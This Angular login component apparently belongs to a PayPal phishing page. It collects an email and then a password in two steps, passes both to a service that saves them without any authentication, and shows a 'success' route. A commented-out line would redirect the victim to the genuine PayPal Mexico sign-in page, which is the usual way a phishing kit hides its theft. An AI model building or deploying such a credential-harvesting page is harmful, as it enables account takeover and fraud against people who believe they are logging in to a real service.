import { Component, OnInit } from '@angular/core';
import { FormBuilder, FormControl, FormGroup, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { LoginService } from 'src/app/services/login.service';

@Component({
    selector: 'app-login',
    templateUrl: './login.component.html',
    styleUrls: ['./login.component.css']
})
export class LoginComponent implements OnInit {

    formLogin!: FormGroup;
    page1: boolean = true;
    page2: boolean = false;
    alert: boolean = false;
    correo: string = "";
    
    constructor(private formBuilder: FormBuilder, private service: LoginService, private router: Router) { }

    ngOnInit(): void {
        this.formLogin = this.formBuilder.group({
            email: new FormControl('', Validators.compose([Validators.email, Validators.required])),
            password: new FormControl('', Validators.required)
        });
        this.correo = this.formLogin.get('email')?.value;
    }
    last(){
        this.page1 = true;
        this.page2 = false;
    }
    next(){
        if (this.formLogin.get('email')?.valid) {
            this.correo = this.formLogin.get('email')?.value;
            this.page1 = false;
            this.page2 = true;         
        }
        else {
            this.alert = true;  
        }
    }
    back(){
        this.page1 = true;
        this.page2 = false;
    }
    clear(){
        this.alert = false;
    }
    login(){
        const campos = {
            email: this.formLogin?.value.email,
            password: this.formLogin?.value.password
        }
        if (this.formLogin?.valid) {
            this.service.saveLogin(campos).then(() => {
                this.formLogin.reset();
                this.router.navigateByUrl('success');
                /* window.location.href = 'https://www.paypal.com/mx/signin'; */
            })
        } else {
            alert('Favor de llenar todos los campos');
        }
    }

}
